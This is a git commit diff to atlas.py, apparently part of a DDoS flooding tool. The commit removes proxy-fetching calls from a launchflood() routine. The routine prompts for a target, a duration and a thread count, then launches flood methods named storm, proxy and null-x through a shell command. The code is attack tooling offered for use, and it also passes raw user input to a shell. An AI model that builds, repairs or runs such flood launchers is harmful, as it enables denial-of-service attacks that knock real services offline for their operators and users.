b45489deb59f2b2858d200f0d34cfa34096f7b07
AnonPrixorPH <62997139+AnonPrixorPH@users.noreply.github.com>
2022-11-06 15:00:23 +0800

    fixed getproxy() problem

--- atlas.py
+++ atlas.py
@@ -189,7 +189,6 @@ def launchflood():
 				target = input("[X] Target: ")
 				floodtime = int(input("[X] Time: "))
 				thread = int(input("[X] Threads [5-10]: "))
-				getproxy()
 				run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} storm {thread}'], shell=True)
 			except:
 				print("Error try again")
@@ -198,7 +197,6 @@ def launchflood():
 				target = input("[X] Target: ")
 				floodtime = int(input("[X] Time: "))
 				thread = int(input("[X] Threads [5-10]: "))
-				getproxy()
 				run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} proxy {thread}'], shell=True)
 			except:
 				print("Error try again")
@@ -207,7 +205,6 @@ def launchflood():
 				target = input("[X] Target: ")
 				floodtime = int(input("[X] Time: "))
 				thread = int(input("[X] Threads [5-10]: "))
-				getproxy()
 				run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} null-x {thread}'], shell=True)
 			except:
 				print("Error try again")
